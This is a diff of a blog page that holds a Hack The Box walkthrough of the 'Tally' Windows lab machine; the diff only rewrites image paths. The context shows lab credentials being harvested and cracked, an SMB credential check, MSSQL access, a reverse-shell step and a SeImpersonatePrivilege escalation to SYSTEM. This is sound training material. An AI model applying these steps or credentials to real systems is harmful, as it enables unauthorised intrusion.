@@ -125,7 +125,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.85 seconds
-</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.59/_layouts -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k 
+</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/1.png></p><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.59/_layouts -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k 
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -151,7 +151,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 301      GET        2l       10w      155c http://10.10.10.59/_layouts/inc =&gt; http://10.10.10.59/_layouts/inc/
 301      GET        2l       10w      158c http://10.10.10.59/_layouts/styles =&gt; http://10.10.10.59/_layouts/styles/
 301      GET        2l       10w      158c http://10.10.10.59/_layouts/mobile =&gt; http://10.10.10.59/_layouts/mobile/
-</code></pre><ul><li>It&rsquo;s a <code>sharepoint</code><ul><li>We can enum it using this <a href=https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/ target=_blank rel=noopener>post</a></li></ul></li></ul><p><img src=./images/2.png></p><ul><li><code>Documents</code> have 1 item</li></ul><p><img src=./images/3.png></p><ul><li>It contains the password for <code>ftp</code><ul><li><code>UTDRSCH53c"$6hys</code></li></ul></li></ul><p><img src=./images/4.png></p><ul><li><code>Site Pages</code> also contain 1 item<ul><li>I had to add <code>tally</code> to <code>/etc/hosts</code> to see the content</li><li>We have possible usernames: <code>rahul</code>, <code>sarah</code>, <code>tim</code></li><li>And also <code>ftp_user</code> account</li></ul></li></ul><p><img src=./images/5.png></p><p><img src=./images/6.png></p><ul><li><code>ftp</code><ul><li><code>ftp_user:UTDRSCH53c"$6hys</code></li></ul></li></ul><pre tabindex=0><code>└─$ ftp 10.10.10.59
+</code></pre><ul><li>It&rsquo;s a <code>sharepoint</code><ul><li>We can enum it using this <a href=https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/ target=_blank rel=noopener>post</a></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/2.png></p><ul><li><code>Documents</code> have 1 item</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/3.png></p><ul><li>It contains the password for <code>ftp</code><ul><li><code>UTDRSCH53c"$6hys</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/4.png></p><ul><li><code>Site Pages</code> also contain 1 item<ul><li>I had to add <code>tally</code> to <code>/etc/hosts</code> to see the content</li><li>We have possible usernames: <code>rahul</code>, <code>sarah</code>, <code>tim</code></li><li>And also <code>ftp_user</code> account</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/5.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/6.png></p><ul><li><code>ftp</code><ul><li><code>ftp_user:UTDRSCH53c"$6hys</code></li></ul></li></ul><pre tabindex=0><code>└─$ ftp 10.10.10.59
 Connected to 10.10.10.59.
 220 Microsoft FTP Service
 Name (10.10.10.59:kali): ftp_user
@@ -227,7 +227,7 @@ simplementeyo    (tim)
 1g 0:00:00:17 DONE (2023-10-02 16:45) 0.05861g/s 1447p/s 1447c/s 1447C/s simplementeyo..sept17
 Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed.
-</code></pre><ul><li>Let&rsquo;s open <code>keepass</code><ul><li>We have a creds for share <code>Finance:Acc0unting</code></li></ul></li></ul><p><img src=./images/7.png></p><ul><li>Let&rsquo;s test them</li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting
+</code></pre><ul><li>Let&rsquo;s open <code>keepass</code><ul><li>We have a creds for share <code>Finance:Acc0unting</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/7.png></p><ul><li>Let&rsquo;s test them</li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting
 SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
 SMB         10.10.10.59     445    TALLY            [+] TALLY\Finance:Acc0unting 
 </code></pre><ul><li>Now we can access <code>ACCT</code> share</li></ul><pre tabindex=0><code>└─$ smbmap -H 10.10.10.59 -u Finance -p Acc0unting 
@@ -345,7 +345,7 @@ tally\sarah
 NULL          
 
 SQL (sa  dbo@master)&gt; 
-</code></pre><ul><li>Let&rsquo;s get reverse shell<ul><li>I used <code>Powershell #3 (Base64)</code> from <a href=https://www.revshells.com/ target=_blank rel=noopener>https://www.revshells.com/</a></li></ul></li></ul><p><img src=./images/8.png></p><p><img src=./images/9.png></p><ul><li>Check <a href=https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-sarah-firefox---path-2 target=_blank rel=noopener>0xdf</a> for an alternative path</li></ul><h2 id=root>Root</h2><ul><li><code>sarah</code> has <code>SeImpersonatePrivilege</code></li></ul><pre tabindex=0><code>PS C:\users\sarah\desktop&gt; whoami /priv
+</code></pre><ul><li>Let&rsquo;s get reverse shell<ul><li>I used <code>Powershell #3 (Base64)</code> from <a href=https://www.revshells.com/ target=_blank rel=noopener>https://www.revshells.com/</a></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/8.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/9.png></p><ul><li>Check <a href=https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-sarah-firefox---path-2 target=_blank rel=noopener>0xdf</a> for an alternative path</li></ul><h2 id=root>Root</h2><ul><li><code>sarah</code> has <code>SeImpersonatePrivilege</code></li></ul><pre tabindex=0><code>PS C:\users\sarah\desktop&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -411,7 +411,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
 
 [+] CreateProcessWithTokenW OK
-</code></pre><p><img src=./images/10.png></p><ul><li>The box is also vulnerable to <code>CVE-2017-0213</code>, you can check <a href=https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-system-cve---path-3 target=_blank rel=noopener>0xdf</a> for more information</li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/tally/images/10.png></p><ul><li>The box is also vulnerable to <code>CVE-2017-0213</code>, you can check <a href=https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-system-cve---path-3 target=_blank rel=noopener>0xdf</a> for more information</li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ftally%2f&text=%5bHTB%5d%20Machine%3a%20Tally&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ftally%2f&title=%5bHTB%5d%20Machine%3a%20Tally" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ftally%2f&title=%5bHTB%5d%20Machine%3a%20Tally" target=_blank><i class="fab fa-linkedin"></i>
